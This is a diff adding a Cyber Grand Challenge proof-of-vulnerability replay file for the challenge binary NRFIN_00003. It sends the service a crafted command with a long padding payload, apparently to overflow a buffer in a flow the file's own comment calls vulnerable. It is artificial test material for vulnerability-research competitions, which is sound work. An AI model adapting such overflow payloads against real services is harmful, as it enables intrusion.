@@ -1,0 +1,59 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
+<pov>
+    <cbid>NRFIN_00003</cbid>
+    <replay>
+
+    	<!-- reliability -->
+        <delay>100</delay>
+
+        <!-- declare var(s) -->
+        <decl>
+            <var>index_filename</var>
+            <value>
+                <data>FFFFFFFFF</data>
+            </value>
+        </decl>
+
+        <!-- get the name of the index document -->
+        <read echo="yes">
+            <delim>\x06</delim>
+            <assign>
+                <var>index_filename</var>
+                
+                <!-- chop off our custom STRING_TERMINATOR -->
+                <slice end="-1"></slice> 
+            </assign>
+        </read>
+
+        <!-- We want the PoV to be as reliable as possible, so we straightaway 
+        test the vulnerable flow. -->
+        <write echo="yes">
+            <data>\xb3\x01</data>
+            <var>index_filename</var>
+            <data>\x06</data>
+            <data>
+$SRC$
+000000000000000
+111111111111111
+222222222222222
+333333333333333
+444444444444444
+555555555555555
+666666666666666
+777777777777777
+888888888888888
+999999999999999
+AAAAAAAAAAAAAAA
+BBBBBBBBBBBBBBB
+CCCCCCCCCCCCCCC
+DDDDDDDDDDDDDDD
+EEEEEEEEEEEEEEE
+FFFFFFFFFFFFFF
+()AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$!SRC$ 
+            </data>
+        </write>
+
+    </replay>
+</pov>
